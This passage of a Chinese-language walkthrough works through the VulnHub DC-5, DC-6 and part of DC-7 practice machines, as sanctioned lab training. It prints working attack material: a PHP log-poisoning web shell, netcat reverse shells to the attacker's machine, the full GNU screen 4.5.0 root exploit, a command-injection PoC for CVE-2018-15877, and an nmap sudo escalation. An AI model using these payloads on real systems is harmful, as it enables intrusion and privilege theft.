```

  

![](https://pic2.zhimg.com/80/v2-d562314f68c08c923ac986908f7df695_720w.webp)

  

它这边只开放了 `80`（http）和 `111`（RPC）两个端口服务！

RPC 他是一个`RPC`服务，主要是在`nfs`共享时候负责通知客户端，服务器的`nfs`端口号的。简单理解`rpc`就是一个中介服务。

我们先来到 `WEB` 端，但是没有什么可利用点，只有一个表单提交的地方：

```text
http://192.168.1.144/contact.php
```

  

![](https://pic2.zhimg.com/80/v2-e70f9c4bb2f29a4334d20d2a43901859_720w.webp)

  

我随便提交了一些内容，发现了它会被提交到 `thankyou.php` 这个文件：

  

![](https://pic3.zhimg.com/80/v2-0489808f1e8d2a41d8d751c259d2811e_720w.webp)

  

## LFI本地文件包含获取shell

看上去有点像 `LFI`（本地文件包含）漏洞，紧接着我用 KALI 自带的 wfuz 工具对它一顿FUZZ梭哈：

```text
wfuzz -w /usr/share/wfuzz/wordlist/general/test.txt -w /usr/share/wfuzz/wordlist/LFI/LFI-InterestingFiles.txt http://192.168.1.144/thankyou.php?FUZZ=FUZ2Z
```

  

![](https://pic3.zhimg.com/80/v2-540673f502cbc11c22f66d40e67dff16_720w.webp)

  

由于`FUZZ`出来的参数太多了！而且好多都没有，我两眼一迷的仔细找到了一个参数：

```text
http://192.168.1.144/thankyou.php?file=/etc/mysql/my.cnf
```

  

![](https://pic1.zhimg.com/80/v2-9fcaf023bb9716b2e70371c7cdef099c_720w.webp)

  

打开后我发现它可以读取系统文件：

  

![](https://pic2.zhimg.com/80/v2-cceb1157edff06d82bd15befaa1a4ec1_720w.webp)

  

这个时候确定了它存在本地文件包含！那么我继续用 `wfuzz` 缩小我们得到的参数范围：

```text
wfuzz -w /usr/share/wfuzz/wordlist/general/test.txt -w /usr/share/wfuzz/wordlist/LFI/LFI-InterestingFiles.txt --hh 851,835 http://192.168.1.144/thankyou.php?FUZZ=FUZ2Z
--h 是过滤Chars
```

  

![](https://pic3.zhimg.com/80/v2-5e98d626a0b26fb61044cce7254fffbe_720w.webp)

  

这样我们就成功的得到一些可利用的参数：

```text
arget: http://192.168.1.144/thankyou.php?FUZZ=FUZ2Z
Total requests: 2568

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                
===================================================================

000001714:   200        44 L     68 W     861 Ch      "file - /etc/issue"                                                                                                    
000001715:   200        49 L     103 W    1121 Ch     "file - /etc/motd"                                                                                                     
000001716:   200        70 L     104 W    2319 Ch     "file - /etc/passwd"                                                                                                   
000001717:   200        70 L     104 W    2319 Ch     "file - /etc/passwd"                                                                                                   
000001719:   200        96 L     117 W    1558 Ch     "file - /etc/group"                                                                                                    
000001833:   500        38 L     58 W     786 Ch      "file - /etc/php5/apache2/php.ini"                                                                                     
000001844:   500        38 L     58 W     786 Ch      "file - /etc/php5/cgi/php.ini"                                                                                         
000001872:   200        170 L    590 W    4368 Ch     "file - /etc/mysql/my.cnf"                                                                                             
000001926:   200        65662    871324   9389548 C   "file - /var/log/nginx/access.log"
```

  

![](https://pic1.zhimg.com/80/v2-941b6b3663f4b39c7ac8c36b860dacf4_720w.webp)

  

随后我发现了它的一个日志文件里有我们的请求记录：

```text
http://192.168.1.144/thankyou.php?file=/var/log/nginx/access.log
```

  

![](https://pic4.zhimg.com/80/v2-d63b868e98c9485391d6baa541f7e457_720w.webp)

  

既然日志能记录我们的操作，那么我们就写入一句话到日志文件里吧：

```text
http://192.168.1.144/thankyou.php?file=<?php system($_GET['saul']) ?>
```

  

![](https://pic3.zhimg.com/80/v2-449325ba59a78c0e103f392a481166be_720w.webp)

  

(温馨提示：到这里我靶机重启了一下，所以 IP 变了)

接下来然后用日志文件去执行命令 `ls`：

```text
http://192.168.1.144/thankyou.php?file=/var/log/nginx/error.log&saul=ls
```

  

![](https://pic3.zhimg.com/80/v2-d448195d97f25ebdaec1c09a99e8a412_720w.webp)

  

成功执行命令！那么我就用 `nc` 反弹一个`shell`回来吧！先是 KALI `nc` 监听 `5555` 端口，然后访问得到一枚 `shell`：

```text
http://192.168.1.144/thankyou.php?file=/var/log/nginx/error.log&saul=nc -e /bin/bash 192.168.1.128 5555
```

  

![](https://pic3.zhimg.com/80/v2-1a7fcb55a4c820498d23f13c8bc87912_720w.webp)

  

得到 shell 以后我用 `python` 切换到 `bash`：

```text
python -c 'import pty;pty.spawn("/bin/bash")'
```

  

![](https://pic2.zhimg.com/80/v2-39ba01774605f49c826b925a619eb005_720w.webp)

  

## 权限提升

之后我查找 `SUID` 权限的文件发现了 `screen` ：

```text
find / -perm /4000 2>/dev/null
```

  

![](https://pic1.zhimg.com/80/v2-f584af82972291a329428e90f00edb9c_720w.webp)

  

紧接着我又去搜索了一下关于 `screen` 的漏洞，找到了一个提权 `poc`：

```text
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

  

![](https://pic2.zhimg.com/80/v2-cbaf3a9e3225d8deb02c72fa85ee00d1_720w.webp)

  

接着我按照上面的 `POC` 创建了 `libhax.c`、`rootshell.c` 文件，文件内容是：

```text
root@kali:~# cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}


root@kali:~# cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

  

![](https://pic1.zhimg.com/80/v2-6626d125392f45782f2e486a058c52d8_720w.webp)

  

随后用 `gcc` 编译他们：

```text
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c
```

  

![](https://pic3.zhimg.com/80/v2-22482166c648ccee08a9aa3f7af32ba2_720w.webp)

  

编译完后我用 `nc` 把刚刚编译好的文件传到目标服务器上：

```text
KALI：
nc -nlvp 7777 < libhax.so
nc -nlvp 7777 < rootshell

靶机：
nc 192.168.1.128 7777 > libhax.so
nc 192.168.1.128 7777 > rootshell
```

  

![](https://pic4.zhimg.com/80/v2-6cf814b71d8b7bf2729e5b37153e0977_720w.webp)

  

  

![](https://pic4.zhimg.com/80/v2-42afdbc9c4f344fbdfcbbf574629844b_720w.webp)

  

最后按照 `POC` 上面的步骤依次输入命令提权为 `root`：

```text
cd /etc
```

  

![](https://pic3.zhimg.com/80/v2-246c15d5b409e93d6fb4cbfdfef576f6_720w.webp)

  

```text
umask 000
```

  

![](https://pic3.zhimg.com/80/v2-d7d06e2cc641b1a2df59521547ea4346_720w.webp)

  

```text
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
```

  

![](https://pic4.zhimg.com/80/v2-9d4913860739a8423839682f845ad863_720w.webp)

  

```text
screen -ls
```

  

![](https://pic3.zhimg.com/80/v2-ecec0f5d070b5ccd87835cff9e7f706a_720w.webp)

  

```text
/tmp/rootshell
```

  

![](https://pic1.zhimg.com/80/v2-b0e3b1c52539cf48b3579c409695ef0c_720w.webp)

  

最终也是在 `/root` 目录下拿到了 `Flag`：

  

![](https://pic2.zhimg.com/80/v2-4b87a1ee311413673fabafefcb543ea1_720w.webp)

  

## DC6-通关手册

OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job.

```text
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

That should save you a few years. ;-)

## 运用的知识

`wpsacn`爆破网站用户密码  
`wordpress`后台`Activity monitor`插件`命令注入`获取shell  
`nmap`提权获取root

## 信息搜集

拿到 `IP` 后对它进行扫描端口开放服务：

```text
nmap -A -T4 192.168.1.145
```

  

![](https://pic1.zhimg.com/80/v2-816549ce572271015fd3bab14af8e4a0_720w.webp)

  

扫描出来后发现它开放了 `80`（http）、`22`（ssh），紧接着访问 `http://192.168.1.145` 发现它重定向到了这个 URL ：`wordy`

  

![](https://pic1.zhimg.com/80/v2-8663a24e8f2b516eedf19f1abac19260_720w.webp)

  

然后我设置了一下 `hosts` 文件：

  

![](https://pic1.zhimg.com/80/v2-8959b5d6fe7008bca237301f3505777c_720w.webp)

  

设置好之后打开 `http://wordy` 发现它的 CMS 是 `Wordpress` ：

  

![](https://pic2.zhimg.com/80/v2-3afb26359537eaf08a8c49090da9cded_720w.webp)

  

## wpscan爆破网站用户密码

既然是 `wordpress` 那么我就先用 `wpscan` 来对它进行扫描把：

```text
wpscan --url http://wordy/ -e u
```

  

![](https://pic1.zhimg.com/80/v2-e8e51c1552d1c4f34a23d1ae4930e6f4_720w.webp)

  

扫描出来后发现它有这些用户：

```text
admin
jens
graham
mark
sarah
```

紧接着我又生成了一些字典文件来对它网站进行爆破：

```text
cat /usr/share/wordlists/rockyou.txt | grep k01
# 这是作者给我们的提示！
```

生成完字典后对它网站用户名挨个爆破枚举，看看能不能捡漏：

```text
wpscan --url http://wordy/ -U user -P passwords.txt
```

  

![](https://pic3.zhimg.com/80/v2-be30153ae57bf9cb2553feffa4025262_720w.webp)

  

爆破成功后得到 `mark` 的密码：

```text
Username: mark, Password: helpdesk01
```

随后我用得到的账号和密码登陆到了网站的后台发现了一个插件：`Activity monitor`

  

![](https://pic4.zhimg.com/80/v2-78adeb7530df6475fa5b6d66a6e884b7_720w.webp)

  

## Activity monitor 插件命令注入获取shell

看到这个插件我去搜索了一下发现有一个`命令注入`:

  

![](https://pic2.zhimg.com/80/v2-34a52c7f53c586332ea8630bcacf6195_720w.webp)

  

```text
PoC:
-->

<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.1.128 9999 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

  

![](https://pic1.zhimg.com/80/v2-87c55e26a4ffb841c038f3a9fe052e10_720w.webp)

  

设置好之后 KALI 用 `nc` 监听 `6666` 端口，访问 `poc.html` 得到一枚 `shell`：

  

![](https://pic3.zhimg.com/80/v2-8814c8ffbcffe3b09e2e04caa7744aae_720w.webp)

  

  

![](https://pic4.zhimg.com/80/v2-df5938d126d5388827a6662b9fce54e7_720w.webp)

  

先让他得到一个 `bash` 外壳把：

```text
python -c 'import pty;pty.spawn("/bin/bash")'
```

  

![](https://pic2.zhimg.com/80/v2-1a03043e24bfec6969cd65c381a99a25_720w.webp)

  

通过信息搜集我发现 `mark` 目录下有一个文件，里面泄露了 `graham` 的密码：

```text
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

  

![](https://pic2.zhimg.com/80/v2-31bc6af8271874fe74e9981b96e3efc5_720w.webp)

  

拿到密码后我 `ssh` 登陆到了 `graham`：

  

![](https://pic3.zhimg.com/80/v2-dec7bdc8c803c6d623fc795ee222d222_720w.webp)

  

## sudo切换到jens用户

登陆成功后我习惯性的 `sudo -l` 发现 `graham` 用户可以以 `jens` 的身份去运行 `/home/jens/backups.sh` 文件：

查看 `backups.sh` 文件后发现它是一个解压的命令，接着我以 `jens` 身份去运行这个文件成功切换到了 `jens`：

```text
sudo -u jens /home/jens/backups.sh
```

  

![](https://pic2.zhimg.com/80/v2-0eb503eda743b83d02e1ccecafea9f45_720w.webp)

  

## nmap提权

成功来到 `jens` 用户后我又是习惯性的 `sudo -l` 发现它可以以 `root` 身份去运行 `/usr/bin/nmap`：

  

![](https://pic2.zhimg.com/80/v2-621ae0aa47cd7593e018512275e10f1d_720w.webp)

  

最后也是用 `nmap` 提权为 `root` 用户：

```text
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

  

![](https://pic1.zhimg.com/80/v2-f2a7721304be0fc97c3df1a1d397ffd4_720w.webp)

  

最终也是在 `/root` 目录下拿到了 `Flag`～

## DC7-通关手册

DC-7是另一个专门构建的易受攻击的实验室，目的是在渗透测试领域积累经验。

尽管这不是一个过于技术性的挑战，但这并不容易。

虽然这是从早期DC版本开始的逻辑发展（我不会告诉您哪个），但是其中涉及一些新概念，但是您需要自己弄清楚这些概念。:-)如果您需要求助于暴力破解或字典攻击，您可能不会成功。

您需要做的是在盒子外面思考。

Waaaaaay在盒子外面。:-)

下载地址：[https://www.vulnhub.com/entry/dc-7,356/](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//www.vulnhub.com/entry/dc-7%2C356/)

## 运用的知识

`Github`泄露网站数据库配置信息导致泄露`SSH`  
`Drupal`重置网站管理员密码  
`Drupal8`-Getshell  
第三方软件提权`backups.sh`

## 信息搜集

拿到靶机先扫了扫端口开放服务：

```text
nmap -A -T4 192.168.1.146
```

  

![](https://pic3.zhimg.com/80/v2-dfbc7c6f7e29a0dd2298702f70838736_720w.webp)

  

靶机开放了 `22`（ssh）、`80`（http）服务，其中 `NMAP` 检测出 `http` 使用的网站是 `Drupal 8`，我们先打开看看把：

  

![](https://pic2.zhimg.com/80/v2-e0e96ca7b3a2f977f1cfd6b2cf78b489_720w.webp)

  

打开网站页面之后看到了一段提示信息：

```text
Welcome to DC-7

DC-7 introduces some "new" concepts, but I'll leave you to figure out what they are.  :-)

While this challenge isn't all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won't succeed.

What you will have to do, is to think "outside" the box.

Way "outside" the box.  :-)
```

随后看了看 `robots.txt` 文件:

  

![](https://pic1.zhimg.com/80/v2-3cd8537561e49b3bbdce01a53ae76fb0_720w.webp)

  

  

![](https://pic1.zhimg.com/80/v2-6f3105ab23aa8416275347ebc268b6a4_720w.webp)

  

网站上只有这一个信息，那么我还是去找找有关于这个 `CMS` 的漏洞把：

  

![](https://pic4.zhimg.com/80/v2-5d90fdfd0b90e9a4d3d7a8c8c4ef3107_720w.webp)

  

由 `whatweb` 得到的信息它的版本是 `Drupal 8`，我搜索了有关于这个版本的漏洞发现有这些：

  

![](https://pic1.zhimg.com/80/v2-f29e6705e6d5fb44feb22ab792d4d6f4_720w.webp)

  

我挨个去利用了相关的 `POC` ，可惜都没有利用成功！这个时候回过头来再仔细读了一遍网站的提示我发现了一个版权信息：

  

![](https://pic2.zhimg.com/80/v2-0372f4327b3404de2019abb253a44cdd_720w.webp)

  

既然作者提示我们说这个靶机的重点不在盒子里，是在盒子外面，而版权信息显示的是：`DC7USER`，那么会不会跟这个有关呢？

紧接着我抱着好奇心去 `Google` 搜索了 `DC7USER`：

  

![](https://pic1.zhimg.com/80/v2-b69fa2d591223bc71ab6413404c1f6b8_720w.webp)

  

搜索第一个是它的 `Github`，我打开看了看发现有一个项目：

  

![](https://pic1.zhimg.com/80/v2-ce01e7ec9d979e9a7fa292ae342fbef8_720w.webp)

  

点开后我找到了有关线索：

```text
This is some "code" (yes, it's not the greatest code, but that wasn't the point) for the DC-7 challenge.

This isn't a flag, btw, but if you have made it here, well done anyway. :-)
```

  

![](https://pic3.zhimg.com/80/v2-265a9cb52671acf7c076d586813dde8e_720w.webp)

  

这似乎是网站的源代码？于是我注意力放到了 ·config.php· 这个文件，打开看发现是一个数据库配置信息：

```text
<?php
$servername = "localhost";
$username = "dc7user";
$password = "MdR3xOgB7#dW";
$dbname = "Staff";
$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

  

![](https://pic1.zhimg.com/80/v2-bc5e88350a1234e2e7006f8d87b55f48_720w.webp)

  

## 登陆SSH

我用得到的账号和密码尝试登陆网站发现登陆失败：

  

![](https://pic3.zhimg.com/80/v2-166568588b9b3b9a60c49e7e000b6ab6_720w.webp)

  

随后我尝试登陆 `SSH` 登陆成功！

  

![](https://pic1.zhimg.com/80/v2-f652c0ac9860255612e5eadbf1853d58_720w.webp)

  

挺有意思的啊，这个 CTF 靶机超出了我的想象，有点像真正的渗透测试了，有那个味道了有木有！

随后我发现了一个 `mbox` 的文件，里面貌似是一封邮件信息：

```text
From root@dc-7 Thu Aug 29 17:00:22 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3EPu-0000CV-5C
        for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EPu-0000CV-5C@dc-7>
Date: Thu, 29 Aug 2019 17:00:22 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:15:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3EeF-0000Dx-G1
        for root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EeF-0000Dx-G1@dc-7>
Date: Thu, 29 Aug 2019 17:15:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:30:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Esl-0000Ec-JQ
        for root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Esl-0000Ec-JQ@dc-7>
Date: Thu, 29 Aug 2019 17:30:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:45:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:45:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3F7H-0000G3-Nb
        for root@dc-7; Thu, 29 Aug 2019 17:45:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3F7H-0000G3-Nb@dc-7>
Date: Thu, 29 Aug 2019 17:45:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 20:45:21 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 20:45:21 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Hvd-0000ED-CP
        for root@dc-7; Thu, 29 Aug 2019 20:45:21 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Hvd-0000ED-CP@dc-7>
Date: Thu, 29 Aug 2019 20:45:21 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 22:45:17 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 22:45:17 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Jng-0000Iw-Rq
        for root@dc-7; Thu, 29 Aug 2019 22:45:16 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Jng-0000Iw-Rq@dc-7>
Date: Thu, 29 Aug 2019 22:45:16 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Thu Aug 29 23:00:12 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 23:00:12 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3K28-0000Ll-11
        for root@dc-7; Thu, 29 Aug 2019 23:00:12 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3K28-0000Ll-11@dc-7>
Date: Thu, 29 Aug 2019 23:00:12 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Fri Aug 30 00:15:18 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Fri, 30 Aug 2019 00:15:18 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3LCo-0000Eb-02
        for root@dc-7; Fri, 30 Aug 2019 00:15:18 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3LCo-0000Eb-02@dc-7>
Date: Fri, 30 Aug 2019 00:15:18 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Fri Aug 30 03:15:17 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3O0y-0000Ed-To
        for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3O0y-0000Ed-To@dc-7>
Date: Fri, 30 Aug 2019 03:15:17 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]
```

  

![](https://pic2.zhimg.com/80/v2-1351b9a787e3450f1f203e577303648d_720w.webp)

  

仔细看了一看发现它是一个定时脚本：`/opt/script/backups.sh`

我 `ls` 查看了一下，发现它只能 `root` 用户和 `www-data` 修改它，查看了脚本后好像删除了一些文件还有解压文件等等：

```text
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

  

![](https://pic3.zhimg.com/80/v2-526617e84362b07ac804a94b61922d42_720w.webp)

  

## Drupal重置网站管理员密码

其中的 drush 我并不知道是什么命令，紧接着我去搜索了一波发现它是一个简化了创建和管理Drupal8网站的命令行工具。

相关文章：[https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html)

看文档得知 `sql-dump`是使用`mysqldump`或等效的操作导出`Drupal`数据库为`SQL`的命令！

  

![](https://pic4.zhimg.com/80/v2-9fc0675a51587f98858912ce0acec713_720w.webp)

  

由于这个脚本上到处数据库所在的目录是 `/var/www/html`，那么我们也切换到这个目录，随后我用 `drush` 的命令重置了网站后台的密码：

```text
drush user-password admin --password="pass"
```

  

![](https://pic2.zhimg.com/80/v2-2ee5f6381a1be8aa07032fcca4cd33c1_720w.webp)

  

重置完后拿到账号 `admin` 密码 `pass` 登陆到了网站后台：

  

![](https://pic3.zhimg.com/80/v2-d059dbd06910794511330831e9458c66_720w.webp)

  

## Drupal-Getshell

登陆到后台之后，我是 `Google` 上找到了`getshell`的方法，先是从 [https://www.drupal.org/project/php](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//www.drupal.org/project/php) 下载它的模块：

  

![](https://pic3.zhimg.com/80/v2-18d344f3b84d11529ef90f247d13120e_720w.webp)

  

下载完后来到 `Extend` - `Install new module` 上传到网站：

  

![](https://pic2.zhimg.com/80/v2-cac4996a9548367f23d43645f4d23071_720w.webp)

  

  

![](https://pic2.zhimg.com/80/v2-4e38e5b349e7c2b07f65e7b931102f6d_720w.webp)

  

  

![](https://pic1.zhimg.com/80/v2-ecf21f2cedd640f2c427e243e41f1030_720w.webp)

  

然后启用 `PHP Filter` 模块：

  

